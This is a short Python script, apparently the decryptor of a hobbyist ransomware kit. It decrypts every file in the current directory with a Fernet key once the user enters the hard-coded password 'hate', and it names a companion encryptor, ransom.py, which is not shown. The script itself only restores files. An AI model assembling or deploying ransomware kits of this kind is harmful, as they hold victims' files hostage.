import os
from cryptography.fernet import Fernet

data_file = []

for file in os.listdir() :
	if file == "ransom.py" or file == "thekey.key" or file == "dekripsi.py":
		continue
	

	if os.path.isfile(file) :
		data_file.append(file)	
	

with open("thekey.key", "rb") as key :
	kunci_rahasia = key.read()

kata_rahasia = "hate"
input = input("masukkan sandi : ")

if input == kata_rahasia :
	for data in data_file :
		with open(data, "rb") as thefile:
			isi = thefile.read()
		isi_dekripsi = Fernet(kunci_rahasia).decrypt(isi)
	
		with open(data, "wb") as thefile :
			thefile.write(isi_dekripsi)



else:
	pass



